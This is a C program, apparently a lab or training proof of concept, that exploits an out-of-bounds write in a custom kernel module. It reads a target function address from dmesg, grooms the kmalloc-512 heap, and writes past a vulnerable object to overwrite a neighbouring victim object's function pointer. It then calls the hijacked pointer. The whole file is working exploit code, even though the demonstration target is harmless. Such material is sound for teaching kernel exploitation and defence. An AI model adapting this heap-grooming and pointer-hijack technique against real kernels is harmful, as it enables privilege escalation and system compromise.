#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "heap_api.h"

static unsigned long get_bad_addr(void) {
    FILE *fp = popen("dmesg | grep 'bad func'", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char *p = strstr(line, "bad func: 0x");
        if (p) {
            sscanf(p, "bad func: 0x%lx", &addr);
        }
    }
    pclose(fp);
    return addr;
}

int main(void) {
    heap_ctx_t ctx = { .fd = -1 };
    int vulobj_idx;
    int victim_idx;

    printf("[*] Kernel OOB Exploit Simulation\n");

    unsigned long bad_func_addr = get_bad_addr();
    if (bad_func_addr == 0) {
        printf("[-] Failed to find bad_function address from dmesg.\n");
        printf("[-] Ensure the module is loaded and dmesg has the address.\n");
        return -1;
    }
    printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);

    if (heap_open(&ctx, HEAP_DEFAULT_DEVICE) < 0) {
        return -1;
    }
    printf("[+] Device opened successfully.\n");

    printf("[+] Defragmenting kmalloc-512...\n");
    if (heap_defrag(&ctx, "kmalloc-512") < 0) {
        heap_close(&ctx);
        return -1;
    }

    if (heap_alloc_vul(&ctx, 1, &vulobj_idx) < 0) {
        heap_close(&ctx);
        return -1;
    }
    //printf("[+] Successfully alloc vulobj with handler: %d\n", vulobj_idx);

    if (heap_alloc_victim(&ctx, 1, &victim_idx) < 0) {
        heap_close(&ctx);
        return -1;
    }
    //printf("[+] Successfully alloc victim_obj with handler: %d\n", victim_idx);

    printf("[+] Dumping victim before overwrite...\n");
    display_victim(&ctx, victim_idx);

    printf("[+] Executing original funptr...\n");
    if (heap_execute_victim(&ctx, victim_idx) < 0) {
        heap_close(&ctx);
        return -1;
    }

    printf("[+] Overwriting funptr with bad_function address...\n");
    for (int i = 0; i < (int)sizeof(unsigned long); i++) {
        char b = (char)((bad_func_addr >> (i * 8)) & 0xFF);
        if (heap_write_vul(&ctx, vulobj_idx, 512 + i, b) < 0) {
            heap_close(&ctx);
            return -1;
        }
    }
    printf("[+] Overwrite done.\n");

    printf("[+] Dumping victim after overwrite...\n");
    display_victim(&ctx, victim_idx);

    printf("[+] Executing hijacked funptr...\n");
    if (heap_execute_victim(&ctx, victim_idx) < 0) {
        heap_close(&ctx);
        return -1;
    }
    printf("[+] Execute command sent. Run 'dmesg | tail' to check if 'bad' was printed!\n");

    heap_close(&ctx);
    return 0;
}
